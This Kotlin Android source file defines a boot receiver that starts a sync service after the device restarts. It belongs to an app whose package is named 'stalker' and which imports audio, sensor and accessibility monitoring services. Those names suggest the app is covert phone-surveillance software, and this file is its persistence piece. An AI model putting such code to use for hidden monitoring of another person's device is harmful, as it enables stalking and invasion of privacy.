package com.askqing.stalker.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.askqing.stalker.service.AccessibilityMonitorService
import com.askqing.stalker.service.SensorCollectionService
import com.askqing.stalker.service.AudioMonitorService
import com.askqing.stalker.service.SyncService

/**
 * 开机自启动接收器
 * 在设备启动后自动启动监控服务
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action != Intent.ACTION_BOOT_COMPLETED) return

        Log.i(TAG, "收到开机广播，启动服务")

        // 启动同步服务
        val syncIntent = Intent(context, SyncService::class.java)
        context.startForegroundService(syncIntent)

        // 如果无障碍服务已启用，会自动被系统启动
        // 其他服务根据用户设置决定是否启动
    }
}
